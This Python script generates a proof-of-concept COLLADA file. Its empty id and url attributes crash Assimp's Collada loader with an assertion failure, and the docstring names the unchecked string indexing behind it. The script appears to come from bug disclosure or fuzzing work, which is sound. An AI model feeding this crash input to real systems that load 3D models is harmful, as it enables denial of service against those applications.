#!/usr/bin/env python3
"""Generate PoC for Assimp Collada empty attribute assertion failure.

A COLLADA file with empty id="" and url="" attributes on geometry, material,
and effect elements triggers an assertion failure (SIGABRT) in Assimp's
Collada loader. The parser assumes these strings are non-empty and performs
operations like url[0] or id.size()-1 without validation.
"""
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def make_collada_empty_attrs():
    xml = '<?xml version="1.0"?>\n'
    xml += '<COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1">\n'
    xml += '<library_images>\n'
    xml += '  <image id="" name="test"><init_from></init_from></image>\n'
    xml += '</library_images>\n'
    xml += '<library_effects>\n'
    xml += '  <effect id="" name="test"><profile_COMMON>\n'
    xml += '    <newparam sid=""><surface type="2D"><init_from></init_from></surface></newparam>\n'
    xml += '    <technique sid=""><lambert><diffuse><texture texture="" texcoord=""/></diffuse></lambert></technique>\n'
    xml += '  </profile_COMMON></effect>\n'
    xml += '</library_effects>\n'
    xml += '<library_materials>\n'
    xml += '  <material id="" name="test"><instance_effect url=""/></material>\n'
    xml += '</library_materials>\n'
    xml += '<library_geometries>\n'
    xml += '  <geometry id="" name="test"><mesh>\n'
    xml += '    <source id=""><float_array id="" count="0"></float_array></source>\n'
    xml += '    <vertices id=""><input semantic="POSITION" source=""/></vertices>\n'
    xml += '    <triangles count="0"><input semantic="VERTEX" source="" offset="0"/></triangles>\n'
    xml += '  </mesh></geometry>\n'
    xml += '</library_geometries>\n'
    xml += '<library_visual_scenes><visual_scene id="s"><node id="" name="" type="NODE">\n'
    xml += '  <instance_geometry url=""/>\n'
    xml += '</node></visual_scene></library_visual_scenes>\n'
    xml += '<scene><instance_visual_scene url="#s"/></scene>\n'
    xml += '</COLLADA>\n'

    out_path = os.path.join(OUT, "poc.dae")
    with open(out_path, "wb") as f:
        f.write(xml.encode())
    print(f"Written {len(xml)} bytes to {out_path}")


if __name__ == "__main__":
    make_collada_empty_attrs()
